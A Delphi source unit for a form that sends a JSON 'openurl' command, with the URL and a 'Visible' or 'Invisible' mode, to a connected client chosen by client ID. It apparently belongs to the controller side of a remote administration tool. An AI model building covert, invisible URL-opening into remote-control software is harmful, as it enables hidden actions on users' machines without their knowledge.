unit UnitOpenURL;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  ncLines, System.JSON;

type
  TForm8 = class(TForm)
    Edit1: TEdit;
    Button1: TButton;
    ComboBox1: TComboBox;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FLine        : TncLine;
    FClientID    : string;
    FOnSendJSON  : TProc<TncLine, TJSONObject>;
    FOnUnregister: TProc<TncLine>;
  public
    procedure SetupForClient(aLine: TncLine; const aClientID: string;
                             aSendJSON: TProc<TncLine, TJSONObject>;
                             aUnregister: TProc<TncLine>);
  end;

var
  Form8: TForm8;

implementation

{$R *.dfm}

procedure TForm8.SetupForClient(aLine: TncLine; const aClientID: string;
  aSendJSON: TProc<TncLine, TJSONObject>; aUnregister: TProc<TncLine>);
begin
  FLine         := aLine;
  FClientID     := aClientID;
  FOnSendJSON   := aSendJSON;
  FOnUnregister := aUnregister;

  Caption := 'Open URL - ' + FClientID;
  if ComboBox1.Items.Count > 0 then
    ComboBox1.ItemIndex := 0;
end;

procedure TForm8.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'openurl');
    JSONObj.AddPair('url',    Edit1.Text);
    JSONObj.AddPair('mode',   ComboBox1.Text); // 'Visible' or 'Invisible'
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm8.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) then
    FOnUnregister(FLine);
  Action := caFree;
end;

end.
